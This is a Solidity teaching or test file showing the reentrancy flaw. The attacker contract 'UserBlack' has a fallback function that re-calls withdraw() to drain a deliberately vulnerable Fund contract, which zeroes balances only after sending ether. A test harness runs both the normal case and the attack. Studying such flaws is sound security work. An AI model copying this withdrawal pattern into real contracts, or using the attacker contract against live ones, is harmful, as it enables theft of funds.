pragma solidity ^0.4.4;

// 
// http://solidity.readthedocs.io/en/develop/security-considerations.html#security-considerations
// https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/ReentrancyGuard.sol
// 
import 'github.com/OpenZeppelin/zeppelin-solidity/contracts/ReentrancyGuard.sol';

contract User {
    
    function callWithdraw(Fund fund){
        fund.withdraw();
    }
    
    function () payable {}
    
}

contract UserBlack {
    
    Fund fund;
    
    function callWithdraw(Fund _fund){
        fund = _fund;
        fund.withdraw();
    }
    
    function () payable {
        // Any interaction from a contract (A) with another contract (B) and 
        // any transfer of Ether hands over control to that contract (B).
        fund.withdraw();
    }
    
}

contract Fund {
    /// Mapping of ether shares of the contract.
    mapping(address => uint) shares;
    
    /// Withdraw your share.
    function withdraw() {
        if (msg.sender.send(shares[msg.sender]))
            shares[msg.sender] = 0;
    }
    
    // 
    // rename to withdraw() for UserBlack Reentrancy.
    // https://ethereum.stackexchange.com/questions/6470/send-vs-call-differences-and-when-to-use-and-when-not-to-use
    // 
    function withdrawGas(){
        // msg.sender.send(number) msg.sender.call.gas(0).value(number)();
        if (msg.sender.call.gas(400000).value(shares[msg.sender])())
            shares[msg.sender] = 0;
    }
    
    function () payable {
        
    }
    
    function testAddUser(address user, uint amount){
        shares[user] = amount ;
    }
}

contract TestFund {
    
    event UserCallWithdraw(address user, uint userBalance, uint fundBalance);
    
    User user1 = new User();
    User user2 = new User();
    UserBlack userBlack = new UserBlack();
    
    function TestFund () payable {}
    function () payable {}
    
    function testWithdraw(){
        Fund fund = new Fund();
        fund.transfer(10 ether);
        fund.testAddUser(user1, 1 ether);
        fund.testAddUser(user2, 3 ether);
        user1.callWithdraw(fund);
        UserCallWithdraw(user1,user1.balance, fund.balance);
        user2.callWithdraw(fund);
        UserCallWithdraw(user2,user2.balance, fund.balance);
    }
    
    function testReentracy(){
        Fund fund = new Fund();
        fund.transfer(100 ether);
        fund.testAddUser(user1, 1 ether);
        fund.testAddUser(userBlack, 1 ether);
        user1.callWithdraw(fund);
        UserCallWithdraw(user1,user1.balance, fund.balance);
        userBlack.callWithdraw(fund);
        UserCallWithdraw(userBlack,userBlack.balance,fund.balance);
    }
    
}
